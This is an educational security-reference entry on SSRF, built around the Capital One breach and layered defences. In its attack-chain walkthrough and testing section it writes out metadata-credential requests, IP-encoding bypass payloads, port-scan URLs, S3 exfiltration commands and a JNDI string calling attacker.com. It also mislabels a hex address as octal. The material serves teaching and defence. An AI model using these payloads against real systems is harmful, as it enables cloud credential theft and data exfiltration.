---
id: SEC-060
title: "SSRF (Server-Side Request Forgery)"
category: "Security"
tier: tier-2-networking-security
folder: SEC-security
difficulty: ★★★
depends_on: SEC-001, SEC-013, SEC-016, SEC-041, SEC-051, SEC-055
used_by: SEC-082, SEC-087, SEC-092, SEC-095
related: SEC-001, SEC-013, SEC-016, SEC-041, SEC-051, SEC-055, SEC-082
tags:
  - security
  - ssrf
  - server-side-request-forgery
  - cloud-security
  - aws-metadata
  - owasp-a10
  - capital-one
status: complete
version: 4
layout: default
parent: "Security"
grand_parent: "Technical Mastery"
nav_order: 60
permalink: /technical-mastery/sec/ssrf-server-side-request-forgery/
---

⚡ TL;DR - SSRF allows attackers to make the server fetch URLs
they supply, potentially reaching internal services. In cloud
environments, SSRF can access the AWS metadata endpoint
(169.254.169.254) to steal IAM credentials → full AWS account
access. Fix: allowlist of permitted external domains; block
internal IP ranges; use IMDSv2 for AWS.

**Capital One 2019:** SSRF → AWS metadata → IAM role credentials
→ ListBuckets on all S3 → 106 million customer records stolen.

---

| #060 | Category: Security | Difficulty: ★★★ |
|:---|:---|:---|
| **Depends on:** | OWASP Top 10, Input Validation, Security Fundamentals, Security Code Review, Open Redirect, OWASP Workshop | |
| **Used by:** | Log4Shell Analysis, Advanced JWT Attacks, Security Observability, SSRF to Internal Exploitation | |
| **Related:** | Open Redirect, AWS Security Services, CORS, Cloud Security | |

---

### 🔥 The Problem This Solves

**WHY SSRF IS CRITICAL IN CLOUD ENVIRONMENTS:**

```
SSRF ATTACK CHAIN: How SSRF became the Capital One breach

STEP 1: Find the SSRF vulnerability
  Application feature: "Import document from URL"
    POST /api/import
    Body: {"url": "https://docs.example.com/report.pdf"}
    Server fetches the URL, processes the document, returns data.
  
  Attacker tests: {"url": "http://169.254.169.254/latest/meta-data/"}
    169.254.169.254 = AWS Instance Metadata Service (IMDS)
    Only accessible from within the AWS instance (link-local address)
    Normally: external clients cannot access it.
    With SSRF: the SERVER is making the request from inside AWS.
    The server IS the AWS instance. It CAN access 169.254.169.254.
    
  Response: "iam/\niam/security-credentials/\nlocal-hostname\n..."
  A directory listing of the metadata API.

STEP 2: Extract IAM credentials
  Attacker: {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  Response: "ec2-role-for-app"  ← Name of the IAM role
  
  Attacker: {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-for-app"}
  Response:
    {
      "Code": "Success",
      "LastUpdated": "2019-03-22T00:00:00Z",
      "Type": "AWS-HMAC",
      "AccessKeyId": "ASIA...",
      "SecretAccessKey": "...",
      "Token": "...",                    ← Temporary credentials
      "Expiration": "2019-03-22T06:00:00Z"
    }
  
  Attacker now has temporary AWS credentials with the EC2 instance's role.

STEP 3: Use credentials to access AWS resources
  aws s3 ls --region us-east-1 (using stolen credentials)
  → Lists ALL S3 buckets accessible by the IAM role
  
  aws s3 cp s3://capital-one-customer-data/ . --recursive
  → Downloads all customer data (if role had overly broad S3 access)
  
  THE IAM ROLE HAD:
    s3:GetObject on * (all buckets, all objects)
    s3:ListBucket on * (all buckets)
  
  RESULT: 106 million customers' financial data exfiltrated.
  Fine: $80 million (OCC). Settlement: $190 million (class action).

THE CHAIN:
  SSRF vulnerability + IMDSv1 (no auth) + overly broad IAM role
  = complete AWS credential theft and data exfiltration
  
  Fix any link in the chain to stop the attack:
    1. No SSRF: allowlist URLs (no metadata endpoint)
    2. IMDSv2: requires session token (SSRF can't get it easily)
    3. Least-privilege IAM: even with credentials, limited access
```

---

### 📘 Textbook Definition

**Server-Side Request Forgery (SSRF):** A web security vulnerability
(OWASP A10 2021) where an attacker can cause the server to make
HTTP requests to a URL of the attacker's choice. The server's
request originates from inside the network, bypassing network-level
controls that would block the same request from the internet.

**Two types of SSRF:**
- **Basic SSRF:** The server's response to the attacker's URL is
  returned to the attacker. Attacker sees the response.
- **Blind SSRF:** The server's response is not returned to the
  attacker. Attacker can only infer server-side network access
  via timing, DNS callbacks (e.g., Burp Collaborator), or
  error messages. Harder to exploit but still dangerous.

**SSRF-accessible targets:**
- AWS metadata: `http://169.254.169.254/latest/meta-data/iam/...`
- GCP metadata: `http://metadata.google.internal/computeMetadata/v1/...`
- Azure metadata: `http://169.254.169.254/metadata/instance?api-version=...`
- Internal services: Redis (`http://localhost:6379`), Elasticsearch, Kubernetes API
- Other cloud services in the same VPC
- Internal web applications (admin panels not exposed to internet)

**IMDSv2 (Instance Metadata Service v2):** AWS's mitigation for
SSRF against the metadata endpoint. IMDSv2 requires a session
token obtained via a PUT request with `X-aws-ec2-metadata-token-ttl-seconds`
header. A basic SSRF (GET only) cannot obtain the session token
and therefore cannot access metadata. IMDSv2 is enabled by default
on new EC2 instances (2022+).

---

### ⏱️ Understand It in 30 Seconds

**One line:**
SSRF = you trick the server into fetching a URL you control.
The server's request comes from inside the network, so it
can reach internal services (Redis, admin APIs) and cloud
metadata endpoints (169.254.169.254). In cloud: SSRF →
IAM credentials → account takeover.

**One analogy:**
> SSRF is like hiring a mailman who lives inside a secured
> building to pick up packages from restricted areas.
>
> You (attacker): "Please go to Vault Room 7 and bring me what's there."
> Mailman (server): "I live in this building, I can access Vault Room 7.
> Here's what I found." (returns the metadata response)
>
> A direct request from outside would be blocked at the lobby.
> But the mailman lives inside - he bypasses the lobby security.
>
> The fix: the mailman follows a list of approved pickup addresses
> (allowlist). "I can only pick up from: Building A loading dock,
> Building B front office." Vault Room 7 is not on the list → refused.

---

### 🔩 First Principles Explanation

**SSRF prevention layers:**

```
LAYER 1: URL ALLOWLIST (most effective)

  VULNERABLE:
    url = request.json['url']
    response = requests.get(url)  # Any URL the attacker provides!
  
  CORRECT (allowlist approach):
    ALLOWED_HOSTS = frozenset({
        'docs.example.com',
        'cdn.example.com',
        'api.github.com',
    })
    
    from urllib.parse import urlparse
    
    def validate_url(url: str) -> str:
        parsed = urlparse(url)
        if parsed.scheme not in ('http', 'https'):
            raise ValueError(f"Scheme not allowed: {parsed.scheme}")
        if parsed.hostname not in ALLOWED_HOSTS:
            raise ValueError(f"Host not in allowlist: {parsed.hostname}")
        return url

LAYER 2: BLOCK INTERNAL IP RANGES (defense in depth)

  Even if URL validation has a bypass: block internal IPs.
  
  Internal IP ranges to block:
    127.0.0.0/8       (loopback: localhost, 127.0.0.1)
    10.0.0.0/8        (private class A)
    172.16.0.0/12     (private class B)
    192.168.0.0/16    (private class C)
    169.254.0.0/16    (link-local: AWS metadata)
    100.64.0.0/10     (CGNAT)
    ::1/128           (IPv6 loopback)
    fc00::/7          (IPv6 unique local)
  
  import ipaddress
  
  def is_internal_ip(ip_str: str) -> bool:
      try:
          ip = ipaddress.ip_address(ip_str)
          return (
              ip.is_loopback or
              ip.is_private or
              ip.is_link_local or
              ip.is_reserved
          )
      except ValueError:
          return True  # Invalid IP - treat as internal (fail safe)
  
  CRITICAL: resolve the DNS name BEFORE checking the IP.
  DNS rebinding attack:
    1. Attacker registers evil.com. DNS returns 1.2.3.4 (external).
    2. URL check: hostname=evil.com → not in blocklist → allowed.
    3. Attacker changes evil.com DNS to 169.254.169.254.
    4. Server resolves again when making the request: now 169.254.169.254!
    5. Request reaches AWS metadata.
  
  FIX (check after resolution):
    import socket
    resolved_ip = socket.getaddrinfo(hostname, None)[0][4][0]
    if is_internal_ip(resolved_ip):
        raise ValueError("Resolved to internal IP - SSRF blocked")
    
    # THEN make the request to the resolved IP
    # (Re-resolve during request creates a race condition - use socket.connect())

LAYER 3: AWS IMDSV2 (cloud-specific)

  IMDSv2 requires a session token:
    # Get session token (requires PUT, X-aws-ec2-metadata-token-ttl-seconds header)
    TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    
    # Use token in subsequent requests
    curl -H "X-aws-ec2-metadata-token: $TOKEN" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/
    
    SSRF via GET request CANNOT get the session token.
    A basic GET SSRF to 169.254.169.254 returns 401 with IMDSv2.
    
    Enforce IMDSv2 on all EC2 instances:
    aws ec2 modify-instance-metadata-options \
      --instance-id i-XXXXX \
      --http-tokens required \  # IMDSv2 required
      --http-put-response-hop-limit 1  # Prevents containers from reaching metadata
    
    Terraform:
      resource "aws_instance" "app" {
        metadata_options {
          http_tokens   = "required"  # IMDSv2 only
          http_hop_limit = 1
        }
      }

LAYER 4: LEAST-PRIVILEGE IAM (blast radius reduction)

  Even if SSRF + IMDSv1 → credentials stolen:
    IAM role with: s3:GetObject on arn:aws:s3:::specific-bucket/*
    vs.
    IAM role with: s3:GetObject on arn:aws:s3:::*/*
  
  The first: attacker can read one bucket.
  The second (Capital One case): attacker reads all buckets.
  
  Principle: grant only the specific permissions the service needs.
  If it reads from bucket X: s3:GetObject on arn:aws:s3:::bucket-x/*
  Not: s3:* on * (effectively: do anything with any S3 bucket)
```

---

### 🧪 Thought Experiment

**SCENARIO: Blind SSRF via URL import feature**

```
FEATURE: "Import external content" - server fetches a URL and
processes it. The response is not directly returned to the user
(processed internally - e.g., imported into a document).

BASIC SSRF (response returned): easy to exploit.
BLIND SSRF (no response): harder to exploit, but still dangerous.

HOW TO DETECT BLIND SSRF (attacker's perspective):
  1. DNS callback: provide URL pointing to an attacker-controlled server.
     Use Burp Collaborator or interactsh.io: https://xxx.burpcollaborator.net
     If server resolves this URL: see DNS query in Collaborator.
     Proves SSRF (server made an outbound request to your domain).
  
  2. Timing-based: internal services respond differently than non-existent.
     http://169.254.169.254/: connects immediately (AWS metadata, returns response)
     http://10.0.0.255/: no response (non-existent host, 30s timeout)
     Time difference: proves port/host scanning via SSRF.
  
  3. Error message oracle:
     Some SSRF responses return: "Connection refused" (port closed),
     "Connection timed out" (host unreachable), "200 OK" (open).
     These error messages are a port/service scanner!

BLIND SSRF CAN STILL CAUSE:
  Port scanning of internal network (which hosts/ports are open)
  Service fingerprinting (what services are running on internal hosts)
  Cache poisoning (internal caches accept requests via SSRF)
  Metadata access if IMDSv1 (despite blind: response logged or processed)
  SSRF to log4shell endpoint (blind SSRF → Log4j JNDI → RCE)

DEFENSE AGAINST BLIND SSRF:
  Same defenses as for basic SSRF:
    Allowlist of permitted URLs (most effective)
    Block internal IP ranges (after DNS resolution)
  Additionally: monitor outbound HTTP requests from your servers.
    Unusual outbound requests to non-allowed domains → SSRF indicator.
```

---

### 🧠 Mental Model / Analogy

> SSRF is like using a trusted insider to fetch information
> from a restricted area that you can't access directly.
>
> External attacker directly:
> "I want to access the server's IAM metadata" → BLOCKED by firewall.
> The metadata endpoint is link-local: only accessible from within AWS.
>
> SSRF:
> "Vulnerable server, please fetch http://169.254.169.254/ for me."
> Server: "That's within my network. Let me get that for you." → Fetches it.
> Server is the trusted insider. Firewall doesn't block the server.
>
> The attacker uses the server as a proxy to reach otherwise
> inaccessible internal resources.
>
> Allowlisting = the server is told: "You can only fetch from
> these specific approved addresses. Anything else: refused."
> The metadata endpoint is not on the approved list.
> The request is refused regardless of who asks.

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
SSRF lets attackers trick your server into making web requests on their behalf. Your server lives inside the cloud network, so it can reach internal addresses that attackers can't. The most dangerous: the AWS metadata URL (169.254.169.254) that contains temporary cloud credentials. Fix: only allow your server to fetch URLs from a specific approved list.

**Level 2 - How to use it (junior developer):**
Before making any outbound HTTP request with user-supplied URLs: validate against an allowlist of permitted domains. Parse the URL with `urlparse`, check `parsed.hostname in ALLOWED_HOSTS`. Also: block requests to internal IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x, 169.254.x). Resolve DNS before checking the IP (DNS rebinding). On AWS: enforce IMDSv2 in Terraform/CloudFormation for all EC2 instances.

**Level 3 - How it works (mid-level engineer):**
SSRF is dangerous in cloud because cloud services use HTTP APIs on internal addresses: metadata endpoint (169.254.169.254), container metadata (169.254.170.2 in ECS), Kubernetes API (10.96.0.1), internal load balancers. The SSRF attacker uses the server as a proxy to these HTTP-accessible internal APIs. DNS rebinding adds complexity: you must resolve the hostname to an IP and check the IP is not internal. A hostname-only check can be bypassed by controlling the DNS to return different values at different times. After DNS resolution: verify the resolved IP is not in internal ranges, then initiate the connection to the verified IP.

**Level 4 - Why it was designed this way (senior/staff):**
SSRF became OWASP A10 in 2021 because cloud adoption dramatically increased its impact. Before cloud: SSRF reached internal services (Redis, admin panels) - significant but limited. After cloud: SSRF reaches the metadata endpoint, which provides temporary credentials with whatever permissions the IAM role has. AWS IMDSv1 (version 1) had no authentication requirement by design - it was intended to be accessed only by the EC2 instance itself via the link-local address. The assumption that the link-local address is accessible only from the instance was violated by SSRF vulnerabilities in applications running on the instance. IMDSv2 was released in 2019 specifically to mitigate SSRF-based metadata access by requiring a PUT request with a custom header (which SSRF GET requests cannot provide).

**Level 5 - Mastery (distinguished engineer):**
Advanced SSRF: SSRF → Log4Shell exploitation chain: Log4j 2.x evaluates JNDI LDAP URIs in log messages. An SSRF that fetches a URL triggering a log message (e.g., a URL containing `${jndi:ldap://attacker.com/a}`) can remotely trigger Log4Shell in a service that logs inbound URLs. This chain required no direct access to the vulnerable Log4j service - just an SSRF vector that eventually caused a string to be logged. At scale: SSRF in microservices propagates horizontally - a single SSRF in a public-facing service can reach any other microservice in the same VPC without network segmentation. VPC security groups that allow all traffic between services in the same VPC increase SSRF blast radius. Defense: service-mesh-level mTLS + per-service network policies (Kubernetes NetworkPolicy, AWS Security Groups per-pod) to limit which services can talk to which.

---

### ⚙️ How It Works (Mechanism)

**Complete SSRF defense implementation:**

```
SAFE HTTP FETCH UTILITY (Python):

import ipaddress
import socket
import urllib.parse
import httpx

ALLOWED_SCHEMES = frozenset({'https'})  # HTTPS only
ALLOWED_HOSTS = frozenset({
    'api.github.com',
    'cdn.example.com',
    'docs.example.com',
})

def safe_fetch(url: str, timeout: int = 10) -> bytes:
    """
    Fetch a URL with SSRF protection.
    Only allows URLs matching ALLOWED_HOSTS over HTTPS.
    Validates the resolved IP is not internal.
    
    Raises ValueError on disallowed URLs.
    """
    # Step 1: Parse URL
    try:
        parsed = urllib.parse.urlparse(url)
    except Exception:
        raise ValueError("Invalid URL")
    
    # Step 2: Scheme check
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Scheme not allowed: {parsed.scheme}")
    
    # Step 3: Hostname check (allowlist)
    hostname = parsed.hostname
    if not hostname:
        raise ValueError("No hostname in URL")
    if hostname not in ALLOWED_HOSTS:
        raise ValueError(f"Host not in allowlist: {hostname}")
    
    # Step 4: DNS resolution + IP check (prevent DNS rebinding)
    try:
        addrinfos = socket.getaddrinfo(hostname, None)
        for addrinfo in addrinfos:
            ip_str = addrinfo[4][0]
            ip = ipaddress.ip_address(ip_str)
            if (ip.is_loopback or ip.is_private or
                    ip.is_link_local or ip.is_reserved):
                raise ValueError(
                    f"Hostname {hostname} resolves to internal IP {ip_str}"
                )
    except socket.gaierror as e:
        raise ValueError(f"DNS resolution failed: {e}")
    
    # Step 5: Fetch (with timeout + redirect limit)
    try:
        resp = httpx.get(
            url,
            timeout=timeout,
            follow_redirects=True,
            max_redirects=3,           # Limit redirect chain
        )
        resp.raise_for_status()
        return resp.content
    except httpx.TimeoutException:
        raise ValueError("Request timed out")
    except httpx.TooManyRedirects:
        raise ValueError("Too many redirects")
```

---

### 💻 Code Example

**AWS: enforce IMDSv2 and least-privilege IAM:**

```hcl
# Terraform: EC2 with IMDSv2 enforced + least-privilege IAM

# IAM role with minimal permissions
resource "aws_iam_role" "app_role" {
  name = "app-ec2-role"
  
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = {
        Service = "ec2.amazonaws.com"
      }
    }]
  })
}

# Least-privilege S3 policy (specific bucket only)
resource "aws_iam_policy" "app_s3_policy" {
  name = "app-s3-read-specific-bucket"
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = ["s3:GetObject"]                        # Read only
        Effect = "Allow"
        Resource = "arn:aws:s3:::my-app-bucket/*"        # Specific bucket
        # NOT: "arn:aws:s3:::*/*" (all buckets - Capital One mistake)
      }
    ]
  })
}

resource "aws_iam_role_policy_attachment" "app_s3" {
  role       = aws_iam_role.app_role.name
  policy_arn = aws_iam_policy.app_s3_policy.arn
}

# EC2 with IMDSv2 required
resource "aws_instance" "app" {
  ami           = "ami-0123456789"
  instance_type = "t3.medium"
  iam_instance_profile = aws_iam_instance_profile.app.name
  
  metadata_options {
    http_tokens                 = "required"  # IMDSv2 only (not optional!)
    http_put_response_hop_limit = 1           # Block containers from reaching metadata
    http_endpoint               = "enabled"
  }
  
  tags = {
    Name = "app-server"
  }
}
```

---

### ⚖️ Comparison Table

| Defense | Protects Against | Limitation |
|:---|:---|:---|
| **URL allowlist** | All SSRF (only approved destinations) | Requires maintaining allowlist |
| **Block internal IPs (after DNS resolve)** | IP-based internal service access | Doesn't protect against DNS rebinding if checked before resolve |
| **IMDSv2 (AWS)** | SSRF → metadata endpoint | Only AWS; doesn't block other internal services |
| **Least-privilege IAM** | Blast radius reduction if SSRF succeeds | Doesn't prevent credential theft |
| **Egress firewall** | Network-level SSRF prevention | Requires infrastructure team; doesn't stop localhost |
| **No user-supplied URLs** | All SSRF | Limits feature capability |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|:---|:---|
| Blocking "169.254.169.254" as a string is sufficient. | Attackers bypass string matching with alternative representations of the same IP: decimal (2852039166), octal (0xA9FEA9FE), IPv6 equivalent (::ffff:169.254.169.254), URL-encoded bytes. Also, DNS rebinding: the hostname check passes (the hostname is not "169.254.169.254"), but DNS later resolves to that IP. The correct defense combines: (1) allowlist permitted hostnames, (2) resolve to IP, (3) check the resolved IP against internal IP ranges using `ipaddress.ip_address().is_private`, `.is_loopback`, `.is_link_local`. A string-based check on the URL is bypassable; an IP-address-object check on the resolved IP is reliable. |
| SSRF is only dangerous if the response is returned to the attacker (blind SSRF = low severity). | Blind SSRF (where the server's response is not returned to the attacker) is still exploitable for: (1) internal service port scanning (timing/error messages reveal open ports), (2) triggering actions on internal services (Elasticsearch reindex, Redis FLUSHALL, RabbitMQ queue operations), (3) exploiting vulnerabilities in internal services that accept HTTP requests (an internal admin API without auth is fully exploitable even blind), (4) SSRF as a stepping stone in exploit chains (SSRF → Log4Shell via JNDI). The severity of blind SSRF depends on what internal services are accessible. In cloud: blind SSRF + IMDSv1 → credentials → full account compromise (attacker just can't see the metadata response directly, but can use the credentials they extracted). |

---

### 🚨 Failure Modes & Diagnosis

**Testing for SSRF:**

```
TESTING METHODOLOGY:

Step 1: Find SSRF entry points
  Look for features that fetch external content:
    URL import, webhook registration, file import from URL
    Image/document fetch from URL
    PDF/screenshot generation services
    Proxy or redirect functionality
    "Preview URL" features
  
  Look in API parameters for URL-like fields:
    {"url": ..., "callback": ..., "webhook": ..., "redirect": ..., "src": ...}

Step 2: Basic SSRF test
  Submit: {"url": "http://169.254.169.254/latest/meta-data/"}
  Expected: 400 Bad Request (URL blocked) or 403 Forbidden
  Vulnerable: Response contains AWS metadata content

Step 3: Test bypass techniques
  {"url": "http://2852039166/"}    (decimal IP for 169.254.169.254)
  {"url": "http://0xA9FEA9FE/"}   (hex IP)
  {"url": "http://localtest.me/"} (DNS that resolves to 127.0.0.1)
  {"url": "http://attacker.com/"} (test DNS callback via Collaborator)

Step 4: Blind SSRF (DNS callback)
  Use Burp Collaborator or interactsh.io to get a unique subdomain.
  Submit: {"url": "https://abcdef.burpcollaborator.net/"}
  Check Collaborator: did you receive a DNS lookup?
  If yes: the server made an outbound request → SSRF confirmed.

Step 5: Port scanning via SSRF
  Submit: {"url": "http://localhost:6379/"} (Redis)
  Submit: {"url": "http://localhost:9200/"} (Elasticsearch)
  Submit: {"url": "http://localhost:2375/"} (Docker API)
  Compare response times and error messages:
    "Connection refused" = port closed
    Timeout = host unreachable
    Response content = port open, service accessible!
```

---

### 🔗 Related Keywords

**Prerequisites:**
- `OWASP Top 10` - A10 SSRF category
- `Input Validation` - URL validation
- `Open Redirect` - related URL manipulation
- `Security Code Review` - finding SSRF in code

**Builds on this:**
- `Log4Shell 2021` - SSRF as exploit delivery vector
- `SSRF to Internal Exploitation` - advanced SSRF techniques
- `AWS Security Services` - IMDSv2, IAM least privilege

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ PRIMARY FIX  │ Allowlist of permitted external hosts     │
│ DEFENSE 2    │ Block internal IPs (after DNS resolve)    │
│ AWS FIX      │ IMDSv2 required (http_tokens=required)   │
│ BLAST RADIUS │ Least-privilege IAM role                  │
├──────────────┼───────────────────────────────────────────┤
│ INTERNAL     │ 127.0.0.0/8, 10.0.0.0/8                  │
│ RANGES       │ 172.16.0.0/12, 192.168.0.0/16            │
│ TO BLOCK     │ 169.254.0.0/16 (AWS metadata!)           │
├──────────────┼───────────────────────────────────────────┤
│ CAPITAL ONE  │ SSRF → IMDSv1 metadata → IAM creds       │
│ 2019         │ → overly broad IAM role → 106M records   │
├──────────────┼───────────────────────────────────────────┤
│ TEST WITH    │ http://169.254.169.254/latest/meta-data/  │
│              │ http://localhost:6379 (Redis)             │
└──────────────────────────────────────────────────────────┘
```

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
"A service that fetches on behalf of a user inherits that
user's network trust level - and the service's own."
Any service that makes outbound HTTP requests based on user
input is a proxy. Proxies inherit the network position of the
server - which is inside the cloud VPC, behind the firewall,
with access to internal services and cloud metadata.
The attacker doesn't need to break the perimeter directly;
they route their requests through an inside proxy (your app).
This principle generalizes: any service that executes code
supplied by users (eval(), exec(), Jinja template rendering
with user input, SQL query construction) behaves like a proxy
for the user - executing the user's intent with the server's
privileges. SSRF = HTTP proxy. Template injection = code
execution proxy. SQL injection = database query proxy.
The mitigation in each case: restrict what the proxy can do
(allowlist), not just who can use the proxy (authentication).
Authentication prevents unauthorized users from using the proxy.
Allowlisting limits what the proxy can do even for authorized users.

---

### 💡 The Surprising Truth

The Capital One SSRF vulnerability was in a Web Application
Firewall (WAF) deployed on AWS. A WAF is specifically a security
tool - designed to protect applications. Yet the WAF itself
contained an SSRF vulnerability that was exploited.
The irony: a security appliance became the attack vector.
The WAF had a misconfigured server-side request feature that
accepted user-supplied URLs (the exact pattern for SSRF).
The SSRF reached the AWS metadata endpoint (IMDSv1, no auth),
obtained temporary IAM credentials for the WAF's EC2 role,
and those credentials had overly broad S3 access.
The technical chain: SSRF → IAM credentials → S3 ListBuckets
→ S3 GetObject → 106 million records.
The breach was possible because of three independent failures:
(1) SSRF in the WAF, (2) IMDSv1 (no session token required),
(3) overly broad IAM role. Fixing any one of these three would
have broken the attack chain. Defense in depth: you don't need
to be perfect; you need attackers to face multiple independent
barriers.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**
1. **EXPLAIN** the Capital One 2019 SSRF → IMDSv1 → IAM credentials
   → S3 exfiltration chain step by step.
2. **IMPLEMENT** a safe URL fetch utility: allowlist check, DNS resolution,
   internal IP block using `ipaddress` module.
3. **CONFIGURE** AWS EC2 to enforce IMDSv2 (Terraform `http_tokens=required`)
   and define a least-privilege IAM role (specific S3 ARN, not `*`).
4. **TEST** for SSRF: DNS callback via Burp Collaborator, internal IP probes,
   AWS metadata probe.

---

### 🎯 Interview Deep-Dive

**Q: What is SSRF? Why is it in OWASP Top 10 2021?
How do you prevent it?**

*Why they ask:* Capital One 2019 made SSRF famous. Cloud adoption
made it critical. Tests cloud security awareness.

*Strong answer covers:*
- Definition: server makes HTTP requests to attacker-supplied URLs.
  Server is inside the network, bypasses perimeter controls.
- In cloud: AWS metadata at 169.254.169.254 is link-local.
  External attacker can't reach it. But a server with SSRF can.
  SSRF → metadata → IAM credentials → AWS API access.
- Capital One 2019: SSRF in WAF → IMDSv1 metadata → IAM role with
  broad S3 access → 106 million records → $80M fine.
- IMDSv2: PUT + session token required. Basic GET SSRF fails.
  Enforce with `http_tokens=required` in EC2 metadata options.
- Prevention:
  1. Allowlist permitted external URLs (most effective)
  2. Block internal IP ranges AFTER DNS resolution (prevent DNS rebinding)
  3. IMDSv2 required on all EC2 instances
  4. Least-privilege IAM: even if credentials stolen, limited impact
- Defense in depth: any single layer can have gaps;
  all three layers together make SSRF non-exploitable to critical.
- OWASP A10 2021 (new): wasn't in 2017 list; cloud adoption made it critical.